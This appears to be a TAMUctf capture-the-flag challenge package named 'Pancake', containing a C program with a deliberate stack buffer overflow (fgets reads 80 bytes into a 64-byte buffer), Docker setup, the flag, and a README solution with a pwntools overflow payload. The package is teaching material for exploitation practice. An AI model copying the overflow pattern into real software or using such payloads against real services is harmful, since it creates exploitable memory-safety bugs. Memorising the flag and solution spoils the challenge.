{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{b4s1c_b4ff3r_0verfl0w_g03s_y33t}\"\n",
    "Dockerfile": "FROM debian:bullseye-slim as build\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD pancake.c /tmp/pancake.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:bullseye-slim\n\nRUN apt-get update -y;apt-get install socat -y\n\nCOPY --from=build /tmp/pancake /pwn/pancake\nWORKDIR /pwn\n\nADD flag.txt .\n\nEXPOSE 3220\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat TCP-LISTEN:3220,reuseaddr,fork EXEC:/pwn/pancake,stderr\"]\n",
    "flag.txt": "gigem{b4s1c_b4ff3r_0verfl0w_g03s_y33t}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nCONTAINER := pancake\n\nall: pancake\n\nclean: .PHONY\n\trm -f leaky\n\nleaky: leaky.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile pancake.c\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti --name $(CONTAINER) $(CONTAINER)\n\nrun_detached: docker\n\tdocker run --rm -d -p 3220:3220 --name $(CONTAINER) $(CONTAINER)\n\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/. - | tar xv\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "pancake.c": "#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char **argv) {\n    volatile int modified;\n    char buffer[64];\n\n    modified = 0;\n\n    fgets(buffer, 80, stdin);\n\n    if(modified == 0x08406688) {\n        FILE* flag = fopen(\"flag.txt\", \"r\");\n        char buf[64];\n        if(flag == NULL) {\n            strcpy(buf,\"Flag file is missing, run that exploit again on the server!\");\n        } else {\n            fgets(buf, 64, flag);\n        }\n        printf(\"flag: %s\\n\",buf);\n    } else {\n        printf(\"Try again, you got 0x%08x\\n\", modified);\n    }\n    return 0;\n}\n\n",
    "problem.json": "{\n  \"name\": \"Pancake\",\n  \"category\": \"Pwn\",\n  \"description\": \"Attack this binary to get the flag!\\n<a href='https://tamuctf.com/static-files/pancake'>pancake</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername pancake -quiet</code>\",\n  \"score\" : 100,\n  \"hints\": [\"Set the variable to the correct value to get the flag.\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Glenn Fitzpatrick\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "quick-inspect.png": "[Binary file or unsupported type: png]",
    "README.md": "# Pancakes\n\n## description\n\nAttack this binary to get the flag!\n\n## dev notes\n\nThis is a basic buffer overflow challenge.\nSet the variable to the correct value to get the flag.\n\n## solution\n\nManual inspection in Ghidra quickly shows that pancake has a buffer overflow of `local_14` due to the `fgets` into\n`local_58`.\n\n![](quick-inspect.png)\n\nSimply fill the buffer that the `fgets` writes to with padding and write the value straight into the checked one!\n\n```bash\npython -c \"from pwn import *;import sys; sys.stdout.buffer.write(b'a'*68 + p32(0x08406688))\" | nc -q1 localhost 4444\n```\n\n(Note the use of `p32` from pwntools to get the correct endianness)",
    "category": "pwn"
}